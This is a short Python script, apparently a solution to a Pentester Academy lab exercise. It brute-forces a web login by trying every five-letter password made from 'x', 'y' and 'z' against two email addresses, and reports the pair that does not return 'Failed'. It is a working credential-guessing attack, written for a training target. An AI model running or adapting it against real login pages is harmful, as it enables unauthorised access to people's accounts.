import itertools
import requests

password=(list(map("".join, itertools.product('xyz', repeat=5))))
email=['jack@pentesteracademy.com','admin@pentesteracademy.com']

for username in email:
	for passw in password:
		url='http://pentesteracademylab.appspot.com/lab/webapp/1?email='+username+'&password='+passw
		print ("Trying url:  ",url)
		r=requests.get(url=url)
		if "Failed" not in r.text:
			print ("Success in Brute Force")
			print (username)
			print (passw)
			break
